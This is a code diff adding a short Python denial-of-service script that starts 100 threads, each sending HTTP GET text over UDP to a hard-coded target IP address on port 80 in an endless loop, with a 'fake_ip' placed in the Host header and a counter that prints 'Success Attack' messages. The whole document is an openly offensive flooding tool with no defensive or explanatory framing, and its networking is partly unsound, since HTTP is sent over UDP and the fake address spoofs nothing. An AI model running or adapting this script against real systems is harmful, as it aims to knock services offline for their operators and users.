@@ -1,0 +1,23 @@
+import socket
+import threading
+
+target = "104.21.16.1"
+fake_ip = "105.21.18.1"
+port = 80
+
+attack_num = 0
+
+def attack():
+    global attack_num
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.connect((target, port))
+        sock.sendto(bytes(f"GET / HTTP/1.1\r\n", 'utf-8'), (target, port))
+        sock.sendto(bytes(f"Host: {fake_ip}\r\n\r\n", 'utf-8'), (target, port))
+        attack_num += 1
+        print(f'Success Attack {target}: {attack_num}')
+        sock.close()
+
+for i in range(100):
+    thread = threading.Thread(target=attack)
+    thread.start()
